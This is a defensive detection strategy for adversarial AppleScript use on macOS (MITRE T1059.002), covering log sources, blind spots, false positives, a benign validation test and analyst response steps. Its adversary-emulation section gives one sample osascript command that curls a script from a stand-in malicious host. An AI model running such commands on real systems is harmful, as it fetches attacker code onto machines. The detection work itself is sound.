# Alerting & Detection Strategy: Detect Adversarial Use of AppleScript on macOS

## Goal
This technique aims to detect adversarial attempts to use AppleScript for executing malicious activities on macOS systems. Specifically, it focuses on identifying the unauthorized execution of scripts that can manipulate system processes or exfiltrate data.

## Categorization
- **MITRE ATT&CK Mapping:** T1059.002 - AppleScript
- **Tactic / Kill Chain Phases:** Execution
- **Platforms:** macOS
- [MITRE ATT&CK Reference](https://attack.mitre.org/techniques/T1059/002)

## Strategy Abstract
The detection strategy leverages system logs and event monitoring to identify suspicious use of AppleScript. By analyzing patterns such as unexpected script execution, unusual command-line arguments, or scripts executed from unauthorized locations, the strategy aims to uncover potential malicious activities.

### Data Sources Utilized:
- **System Logs:** Monitor for entries related to `osascript` executions.
- **Application Logs:** Track applications launching AppleScripts.
- **User Activity Monitoring:** Detect anomalies in user behavior concerning script usage.

### Patterns Analyzed:
- Execution of scripts from non-standard directories.
- Scripts containing commands that modify system files or network configurations.
- Unusual timing or frequency of script execution.

## Technical Context
Adversaries exploit AppleScript due to its powerful automation capabilities and integration within macOS. It can be used to execute arbitrary commands, manipulate user interface elements, or automate complex workflows without raising immediate suspicion.

### Real-world Execution:
Attackers may deliver a malicious AppleScript via phishing emails or bundled with legitimate applications. Once executed, the script can perform actions like downloading additional payloads, modifying system settings, or exfiltrating sensitive data.

#### Adversary Emulation Details:
- **Sample Command:** `osascript -e 'do shell script "curl http://malicious-site.com/script.scpt"'`
- **Test Scenario:** Deploy a benign AppleScript that mimics typical malicious behavior to validate detection capabilities.

## Blind Spots and Assumptions
- **Blind Spots:**
  - Encrypted or obfuscated scripts may evade pattern-based detection.
  - Scripts executed directly from the command line without logging may not be detected.

- **Assumptions:**
  - Users have standard permissions, limiting script execution to user-owned directories unless elevated privileges are compromised.
  - Monitoring tools have comprehensive log coverage of AppleScript executions.

## False Positives
Potential benign activities that might trigger false alerts include:
- Legitimate automation scripts used for administrative tasks.
- User-created scripts for personal productivity enhancements.
- Applications with built-in scripting capabilities executing standard operations.

## Priority
**Severity: Medium**

### Justification:
While the use of AppleScript can pose significant risks, especially if combined with other attack vectors, it is less commonly exploited compared to more direct methods. The medium priority reflects its potential impact when used in sophisticated attacks and the need for balanced monitoring to avoid excessive false positives.

## Validation (Adversary Emulation)
### Step-by-Step Instructions:
1. **Preparation:**
   - Ensure a controlled test environment with macOS.
   - Install necessary tools for logging and monitoring script executions.

2. **Script Creation:**
   ```applescript
   osascript -e 'do shell script "echo Hello, World!"'
   ```

3. **Execution:**
   - Run the script from an unauthorized location (e.g., `/tmp`).
   - Observe system and application logs for detection triggers.

4. **Analysis:**
   - Verify that the monitoring tools capture the execution event.
   - Adjust detection parameters if necessary to reduce false positives.

## Response
### Guidelines for Analysts:
1. **Initial Assessment:**
   - Confirm the legitimacy of the script source and intent.
   - Evaluate the scope of actions performed by the script.

2. **Containment:**
   - Isolate affected systems from the network to prevent further malicious activity.
   - Disable any unauthorized scripts or accounts used for execution.

3. **Investigation:**
   - Analyze logs to determine the origin and purpose of the AppleScript.
   - Check for additional indicators of compromise (IoCs) on the system.

4. **Remediation:**
   - Remove malicious scripts and restore affected files from backups.
   - Update security policies to prevent similar incidents in the future.

5. **Reporting:**
   - Document findings and share with relevant stakeholders.
   - Consider reporting to authorities if the activity is part of a larger campaign.
